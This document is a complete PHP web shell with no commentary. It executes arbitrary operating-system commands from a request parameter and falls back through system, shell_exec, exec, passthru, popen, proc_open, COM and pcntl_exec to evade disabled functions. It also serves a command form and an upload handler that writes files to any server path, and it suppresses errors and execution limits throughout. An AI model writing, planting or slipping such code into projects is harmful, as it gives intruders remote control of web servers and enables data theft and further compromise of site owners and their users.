<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('display_errors',0);
$w=strtoupper(substr(PHP_OS,0,3))==='WIN';
function df($f){$d=@ini_get('disable_functions');return(function_exists($f)&&(empty($d)||stripos($d,$f)===false));}
$o='';
if(isset($_REQUEST['c'])&&$_REQUEST['c']!==''){
    $c=$_REQUEST['c'];
    if($w){$c='cmd /c "'.$c.'" 2>&1';}else{$c=$c.' 2>&1';}
    if(df('system')){@ob_start();@system($c);$o=@ob_get_contents();@ob_end_clean();}
    elseif(df('shell_exec')){$o=@shell_exec($c);}
    elseif(df('exec')){$r=array();@exec($c,$r);$o=implode("\n",$r);}
    elseif(df('passthru')){@ob_start();@passthru($c);$o=@ob_get_contents();@ob_end_clean();}
    elseif(df('popen')){$h=@popen($c,'r');if($h){$o='';while(!@feof($h)){$o.=@fread($h,4096);}@pclose($h);}}
    elseif(df('proc_open')){$ds=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($c,$ds,$pi);if(is_resource($p)){@fclose($pi[0]);$o=@stream_get_contents($pi[1]);@fclose($pi[1]);@fclose($pi[2]);@proc_close($p);}}
    elseif($w&&class_exists('COM')){try{$ws=@new COM('WScript.Shell');$e=$ws->Exec('cmd /c '.$_REQUEST['c']);$o=$e->StdOut->ReadAll();}catch(Exception $ex){$o='COM:'.$ex->getMessage();}}
    elseif(df('pcntl_exec')){$o='[pcntl - no output]';@pcntl_exec('/bin/sh',array('-c',$_REQUEST['c']));}
    else{$o='[no-exec-func]';}
    echo $o;
}
if(!isset($_REQUEST['c'])||$_REQUEST['c']===''){
?><html><body><pre><?php echo 'OS:'.PHP_OS.' PHP:'.PHP_VERSION.' CWD:'.@getcwd(); ?></pre>
<form method=post><input name=c size=80 placeholder="command"><input type=submit value=Run></form>
<form method=post enctype="multipart/form-data"><input type=file name=f><input name=n size=40 placeholder="path (dir or file)"><input type=submit value=Upload></form></body></html><?php
}
if(isset($_FILES['f'])&&isset($_FILES['f']['tmp_name'])&&$_FILES['f']['tmp_name']!==''){
    $fn=isset($_FILES['f']['name'])?$_FILES['f']['name']:'uploaded.dat';
    $d=(isset($_POST['n'])&&trim($_POST['n'])!=='')?trim($_POST['n']):$fn;
    if($w&&preg_match('/^\\/([a-zA-Z])\\//',$d,$m)){$d=strtoupper($m[1]).':'.substr($d,2);}
    $d=str_replace('\\','/',$d);
    if(@is_dir($d)){$d=rtrim($d,'/').'/'.$fn;}
    $dir=dirname($d);
    if($dir!==''&&$dir!=='.'&&!@is_dir($dir)){@mkdir($dir,0755,true);}
    $ok=false;$err='';
    if(@move_uploaded_file($_FILES['f']['tmp_name'],$d)){$ok=true;}
    elseif(@copy($_FILES['f']['tmp_name'],$d)){$ok=true;}
    else{$t=@file_get_contents($_FILES['f']['tmp_name']);if($t!==false&&@file_put_contents($d,$t)!==false){$ok=true;}}
    if($ok){echo '<b>OK:</b>'.$d;}else{$e=@error_get_last();echo '<b>FAIL:</b>'.$d.($e?' | '.$e['message']:'');}
}
